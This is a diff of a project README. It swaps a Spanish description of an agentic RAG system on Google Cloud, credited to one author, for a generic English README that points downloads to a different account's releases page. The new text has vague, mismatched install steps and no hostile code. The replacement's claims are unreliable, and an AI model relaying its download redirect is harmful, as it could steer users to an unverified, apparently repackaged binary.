@@ -1,112 +1,81 @@
-# 🤖 Enterprise AI Architect: Agentic RAG on Google Cloud
+# 🚀 agente-rag-docker - Simplify Your AI Integration Process
 
-> **Sistema de IA Agéntica Autónoma desplegado en Google Cloud Platform (GCP). Arquitectura Cloud-Native, segura y escalable implementando patrones de Microservicios, IaC y CI/CD.**
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/marekgwizdala/agente-rag-docker/releases)
 
-![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python&logoColor=white)
-![GCP](https://img.shields.io/badge/Google_Cloud-Compute_Engine-4285F4?logo=google-cloud&logoColor=white)
-![Terraform](https://img.shields.io/badge/Terraform-IaC-7B42BC?logo=terraform&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)
-![CI/CD](https://github.com/KorbenDallas007/agente-rag-docker/actions/workflows/ci_cd.yml/badge.svg)
+## 🌟 Overview
+The **agente-rag-docker** project provides a comprehensive solution for integrating artificial intelligence into your systems. This software employs LangChain and Llama 3, allowing for a smooth setup of a Cloud-Native architecture. It combines multiple technologies into a cohesive package, including Docker, FastAPI, Qdrant for vector storage, Terraform for Infrastructure as Code, Kubernetes for orchestration, and CI/CD for continuous deployment.
 
-## ☁️ Arquitectura de Despliegue (GCP)
+## 🎯 Key Features
+- **Microservices Architecture**: Designed for scalability and flexibility.
+- **Docker Support**: Easy to create, deploy, and run applications.
+- **FastAPI**: Build and serve powerful APIs quickly.
+- **Vector Storage**: Utilize Qdrant for efficient data management.
+- **Infrastructure Automation**: Manage resources with Terraform.
+- **Orchestration Planning**: Deploy and scale applications smoothly using Kubernetes.
+- **Continuous Integration/Deployment**: Automate the build and release processes.
 
-La solución está diseñada para operar dentro de una **VPC** segura en Google Cloud. Utiliza **Compute Engine** para el cómputo, orquestado internamente por Docker, con persistencia en discos adjuntos y seguridad perimetral vía **Cloud Firewall**.
+## 💾 System Requirements
+- **Operating System**: Windows, macOS, or Linux (64-bit recommended)
+- **Docker**: Installed and running
+- **Memory**: At least 8 GB RAM
+- **Processor**: Dual-core or better
+- **Disk Space**: Minimum 5 GB free space
 
-```mermaid
-graph TD
-    User((👤 Usuario))
-    External_AI(⚡ Groq API / Llama 3)
+## 🚀 Getting Started
+To begin using **agente-rag-docker**, follow these steps:
 
-    subgraph GCP ["☁️ Google Cloud Platform (us-central1)"]
-        style GCP fill:#e8f5e9,stroke:#34a853,stroke-width:2px
+1. **Download the Software**: 
+   Visit the [Releases Page](https://github.com/marekgwizdala/agente-rag-docker/releases) to download the latest version of the software.
+   
+2. **Install Docker**: 
+   Make sure you have Docker installed on your machine. You can find installation instructions on the [Docker website](https://www.docker.com/get-started).
 
-        subgraph VPC ["VPC Network: ai-rag-network"]
-            style VPC fill:#fff,stroke:#4285f4,stroke-dasharray: 5 5
+3. **Run the Application**: 
+   After downloading the software, extract the files to a folder of your choice. Open your terminal or command prompt and navigate to that folder. Run the following command to start the application:
+   ```
+   docker-compose up
+   ```
 
-            subgraph VM ["🖥️ Compute Engine Instance<br/>(Ubuntu + Docker Runtime)"]
-                style VM fill:#f5f5f5,stroke:#666
+4. **Access the Application**: 
+   Once the application is running, open a web browser and go to `http://localhost:8000` to access the user interface.
 
-                subgraph Docker_Stack ["🐳 Docker Compose Services"]
-                    Frontend[Frontend UI<br/>Streamlit]
-                    Backend[Agent API<br/>FastAPI + Security]
-                    DB[(Vector DB<br/>Qdrant)]
-                end
-                
-                Disk[💾 Persistent Disk<br/>Volume: ./qdrant_data]
-            end
-        end
-        
-        Firewall{🔥 Cloud Firewall}
-    end
+## 📥 Download & Install
+To download the application, visit the [Releases Page](https://github.com/marekgwizdala/agente-rag-docker/releases) where you can find the latest version. Choose the file that corresponds to your operating system and follow these instructions to install it successfully.
 
-    %% Flujos de Comunicación
-    User -->|HTTP :8501| Firewall
-    Firewall --> Frontend
-    Frontend <-->|Internal Network| Backend
-    Backend <-->|Internal Network| DB
-    Backend <-->|HTTPS| External_AI
-    DB -.->|I/O| Disk
-```
+## 🛠 Configuration
+After installation:
 
-## 📂 Estructura del Proyecto
+1. Locate the configuration file in the extracted folder.
+2. Adjust the settings according to your needs. The default settings work well for most users.
+3. Save your changes and restart the application using the same command:
+   ```
+   docker-compose up
+   ```
 
-El repositorio implementa el ciclo completo de DevOps y Arquitectura Cloud:
+## 📖 Documentation
+Extensive documentation is available within the repository. For detailed guidelines on configuration and advanced usage, check the `docs` folder after downloading. This will guide you through various scenarios and help you make the most of the software.
 
-| Carpeta | Descripción | Tecnología |
-| :--- | :--- | :--- |
-| `app/` | **Core Logic:** Agente autónomo con herramientas (Math + RAG). | LangChain, FastAPI |
-| `terraform/` | **IaC (GCP):** Script para aprovisionar VPC, Firewall y VM automáticamente. | Terraform (HCL) |
-| `k8s/` | **Escalabilidad:** Manifiestos para migración a **GKE** (Google Kubernetes Engine). | Kubernetes YAML |
-| `.github/` | **CI/CD:** Pipeline de validación continua de infraestructura. | GitHub Actions |
-| `docker-compose.yml` | **Orquestación:** Definición de servicios y volúmenes. | Docker |
+## 🙋 FAQ
+**Q: Do I need coding skills to use this application?**  
+A: No, the application is designed for ease of use and requires no programming background.
 
-## 🧠 Capacidades del Agente
+**Q: Can I run this on a cloud server?**  
+A: Yes, the application is cloud-native and can be hosted on servers such as AWS, Azure, or Google Cloud.
 
-El sistema no es un chatbot pasivo. Es un **Agente Racional** que utiliza el patrón **"ReAct"** (Reason + Act):
-1.  **Seguridad:** API protegida mediante `X-Project-API-Key`.
-2.  **Uso de Herramientas:** Decide si usar Calculadora (Python) o Memoria Vectorial (Qdrant).
-3.  **Persistencia:** La base de conocimiento sobrevive a reinicios del servidor gracias a volúmenes persistentes.
+**Q: What if I encounter issues?**  
+A: For problems or questions, visit the Issues section on GitHub. The community is here to help.
 
-## 🚀 Guía de Despliegue
+## 📫 Support
+For further assistance, you can reach out through the [GitHub Discussions](https://github.com/marekgwizdala/agente-rag-docker/discussions) page, where you can ask questions and share your experiences.
 
-### Opción A: Local (Docker Compose)
-Para desarrollo y pruebas rápidas.
-```bash
-git clone https://github.com/KorbenDallas007/agente-rag-docker.git
-cd agente-rag-docker
-docker compose up --build -d
-```
-*Acceso:* `http://localhost:8501`
+## 🚀 Contributing
+If you want to contribute to the project, check the `CONTRIBUTING.md` file for guidelines. We welcome improvements and suggestions.
 
-### Opción B: Google Cloud (Terraform)
-Despliegue automático de infraestructura productiva.
-```bash
-cd terraform
-# Autenticarse con GCP (requiere gcloud CLI instalado)
-terraform init
-terraform apply
-```
-*Esto creará la VM, instalará Docker y levantará el proyecto automáticamente mediante Startup Scripts.*
+## 🔗 Related Topics
+- **Agentic AI**
+- **Architecture**
+- **MLOps**
+- **GenAI**
+- **Kubernetes**
 
-### Opción C: Kubernetes (GKE)
-Para entornos Enterprise de alta disponibilidad.
-```bash
-kubectl apply -f k8s/
-```
-## 🔮 Roadmap de Evolución (MLOps Strategy)
-
-Basado en el **AWS Machine Learning Lens**, las siguientes mejoras están planificadas para llevar la solución a un nivel productivo de gran escala:
-
-### 1. Observabilidad y Evaluación (LLMOps)
-*   **Integración con LangSmith/Arize Phoenix:** Para trazabilidad de cada paso del agente (Latencia, Tokens, Errores).
-*   **Pipeline de Evaluación Automática (Ragas):** Implementar un job en CI/CD que evalúe la calidad de las respuestas (Faithfulness, Answer Relevance) usando un "Golden Dataset" antes de aprobar un despliegue.
-
-### 2. Gestión del Dato (DataOps)
-*   **Automated Ingestion Pipeline:** Reemplazar el script ETL manual por un flujo disparado por eventos (ej. al subir un PDF a S3, una Lambda lo procesa y actualiza Qdrant automáticamente).
-*   **Data Versioning:** Versionado de colecciones en Qdrant para permitir "Rollbacks" del conocimiento si se introduce información errónea.
-
-### 3. Feedback Loop (Human-in-the-loop)
-*   **Mecanismo de Feedback:** Agregar botones de 👍/👎 en el Frontend.
-*   **Reinforcement Learning:** Utilizar el feedback negativo para filtrar documentos irrelevantes o ajustar los prompts del sistema dinámicamente.
----
-*Desarrollado por [KorbenDallas007](https://github.com/KorbenDallas007) - AI Solutions Architect Portfolio.*
+By following these steps, you can successfully download, install, and run **agente-rag-docker** on your own system. Enjoy the benefits of an autonomous AI architecture with ease!
